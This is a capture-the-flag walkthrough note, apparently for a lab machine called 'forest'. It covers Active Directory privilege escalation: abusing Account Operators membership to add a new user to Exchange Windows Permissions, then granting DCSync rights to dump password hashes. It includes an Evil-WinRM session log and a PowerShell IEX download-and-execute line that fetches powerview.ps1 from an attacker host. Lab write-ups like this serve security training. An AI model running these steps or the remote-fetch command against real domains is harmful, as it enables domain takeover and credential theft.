# Finding Shortest Paths to Domain Admins from Owned Principals(svc-alfreso user)
First of all we will mark svc-alfresco as owned.
![[Pasted image 20210727192051.png]]
Then we will find Shortest Paths to Domain Admins from Owned Principals(svc-alfreso user)
![[Pasted image 20210727192533.png]]
As svc-alfresco user is member of Account Operators group, so The Account Operators group grants limited account creation privileges to a user. Members of this group can create and modify most types of accounts, including those of users, local groups, and global groups, and members can log in locally to domain controllers.
Members of the Account Operators group cannot manage the Administrator user account, the user accounts of administrators, or the [Administrators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-admins), [Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators), [Account Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-accountoperators), [Backup Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-backupoperators), or [Print Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-printoperators) groups. Members of this group cannot modify user rights. [Link to read about account operators group further](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups)
In short, we can create new account and add it to `Exchange Windows Permissions` group because `svc-alfreso` user is member of  Account Operators group via following method.
```powershell

*Evil-WinRM* PS clark:\> net user stuart 1234567 /add /domain
The command completed successfully.

*Evil-WinRM* PS clark:\> net group "Exchange Windows Permissions"
Group name     Exchange Windows Permissions
Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted.

Members

-------------------------------------------------------------------------------
The command completed successfully.

*Evil-WinRM* PS clark:\> net group "Exchange Windows Permissions" /add stuart
The command completed successfully.

*Evil-WinRM* PS clark:\> net group "Exchange Windows Permissions"
Group name     Exchange Windows Permissions
Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted.

Members

-------------------------------------------------------------------------------
stuart
The command completed successfully.

*Evil-WinRM* PS clark:\> net group "Exchange Windows Permissions"
Group name     Exchange Windows Permissions
Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted.

Members

-------------------------------------------------------------------------------
stuart
The command completed successfully.

*Evil-WinRM* PS clark:\>
```
After creating new user `stuart` and adding it to `Exchange Windows Permissions` group, we can use `powerview.ps1`(uploaded to forest machine using command `IEX(New-Object Net.WebClient).downloadString('http://10.10.14.105:8000/powerview.ps1')`) to grant `stuart` newly created user who is member of `Exchange Windows Permissions` group `DCSync` rights privilege after which newly created `stuart` user can dump hashes of all users on forest machine.


